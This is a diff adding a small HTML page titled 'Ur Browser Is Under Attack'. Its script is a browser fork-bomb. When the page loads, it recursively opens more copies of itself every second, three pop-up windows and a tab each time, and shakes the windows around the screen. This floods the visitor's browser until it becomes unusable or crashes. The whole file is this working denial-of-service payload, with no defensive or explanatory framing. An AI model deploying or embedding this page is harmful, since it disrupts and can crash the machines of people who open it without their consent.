@@ -1,0 +1,36 @@
+<html>
+<head>
+<title>Ur Browser Is Under Attack</title>
+</head>
+<body>
+<h1>Ur Browser Is Under Attack</h1>
+<script>
+setTimeout(dupe, 1000)
+function dupe() {
+ var window1 = popup(location.href)
+ var window2 = popup(location.href)
+ var window3 = popup(location.href)
+ open(location.href)
+ setInterval(moveWindow, 1000, window1)
+ setInterval(moveWindow, 1000, window2)
+ setInterval(moveWindow, 1000, window3)
+ setTimeout(dupe, 1000)
+}
+function getRandomInt(min, max) {
+  min = Math.ceil(min);
+  max = Math.floor(max);
+  return Math.floor(Math.random() * (max - min) + min); // The maximum is exclusive and the minimum is inclusive
+}
+function moveWindow(wind) {
+ wind.moveBy(getRandomInt(-11, 11), getRandomInt(-11, 11))
+}
+function popup(url) {
+ if (! window.focus)return true;
+ var href;
+ if (typeof(url) == 'string') href=url;
+ else href=url.href; 
+ return window.open(href, "Ur Browser Is Under Attack", 'width=400,height=200,scrollbars=yes');
+}
+</script>
+</body>
+</html>
